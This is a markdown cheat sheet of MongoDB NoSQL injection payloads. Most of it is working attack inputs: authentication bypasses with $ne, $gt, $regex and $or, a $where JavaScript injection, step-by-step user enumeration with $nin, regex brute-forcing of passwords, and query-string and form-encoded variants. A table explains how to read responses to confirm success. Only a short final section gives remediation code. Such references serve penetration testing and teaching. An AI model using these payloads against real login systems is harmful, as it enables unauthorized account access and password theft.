# 💉 NoSQL Injection Payloads Cheatsheet

> All payloads target **MongoDB** operator injection via JSON request bodies.

---

## 🔑 Core Operators

| Operator | Meaning | Usage |
|----------|---------|-------|
| `$ne` | Not Equal | Bypass: match anything ≠ a fake value |
| `$gt` | Greater Than | Bypass: match any non-empty string |
| `$lt` | Less Than | Comparison bypass |
| `$gte` | Greater Than or Equal | Broad match |
| `$regex` | Regular Expression | Enumerate/target specific users |
| `$nin` | Not In (array) | Enumerate — exclude known users |
| `$in` | In (array) | Match from a list |
| `$exists` | Field Exists | Check if field is set |
| `$where` | JavaScript eval | Code execution (MongoDB < 4.4 only) |
| `$or` | Logical OR | Combine conditions |
| `$and` | Logical AND | Combine conditions |

---

## 🚪 Authentication Bypass Payloads

### Basic Bypass — `$ne`
```json
{"username": {"$ne": "invalid"}, "password": {"$ne": "invalid"}}
```

### Greater Than Empty String — `$gt`
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
```

### Regex Match — `$regex`
```json
{"username": {"$regex": "admin"}, "password": {"$ne": "x"}}
```

### Target First Character
```json
{"username": {"$regex": "^a"}, "password": {"$ne": "x"}}
```

### $where JavaScript Injection (Legacy MongoDB only)
```json
{"$where": "this.username == 'admin' || '1'=='1'"}
```

---

## 👥 User Enumeration Payloads — `$nin`

Start with empty exclusion list, then grow it each round:

```json
Round 1: {"userID": {"$ne": "x"}, "password": {"$ne": "x"}}
Round 2: {"userID": {"$nin": ["admin"]}, "password": {"$ne": "x"}}
Round 3: {"userID": {"$nin": ["admin", "dave@gmail.com"]}, "password": {"$ne": "x"}}
Round 4: {"userID": {"$nin": ["admin", "dave@gmail.com", "jude@gmail.com"]}, "password": {"$ne": "x"}}
```

**Stop** when response is `401 Unauthorized` — all accounts enumerated.

---

## 🔤 Password Extraction — Regex Brute Force

Use `$regex` to guess the password character by character:

```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^ab"}}
{"username": "admin", "password": {"$regex": "^abc"}}
```

If `200 OK` → character is correct. If `401` → try next character.

---

## 🌐 HTTP Parameter Pollution (GET-based)

Some apps parse query string into objects. Try:

```
GET /login?username[$ne]=x&password[$ne]=x
GET /login?username[$regex]=admin&password[$gt]=
GET /login?username=admin&password[$ne]=wrongpassword
```

---

## 📝 URL-Encoded Form Injection

For `application/x-www-form-urlencoded` POST bodies:

```
username[$ne]=x&password[$ne]=x
username[$regex]=^admin&password[$gt]=
```

---

## 🔥 Advanced Payloads

### Logical OR bypass
```json
{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}], "password": {"$ne": "x"}}
```

### Field existence check
```json
{"username": {"$exists": true}, "password": {"$exists": true}}
```

### Match any non-null value
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

---

## ✅ Indicators of Success

| Response | Meaning |
|----------|--------|
| `200 OK` + session token | Injection worked — logged in |
| `200 OK` + user data | Data extracted |
| `401 Unauthorized` | Payload did not match — adjust |
| `500 Internal Server Error` | Malformed operator — syntax error in payload |
| Response time increase | Possible blind injection vector |

---

## 🛡️ Quick Remediation Reference

```javascript
// Strip $ operators with express-mongo-sanitize
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize());

// Enforce string types manually
if (typeof req.body.username !== 'string') return res.status(400).send('Bad request');

// Use Joi schema validation
const schema = Joi.object({
  username: Joi.string().required(),
  password: Joi.string().required()
});
```
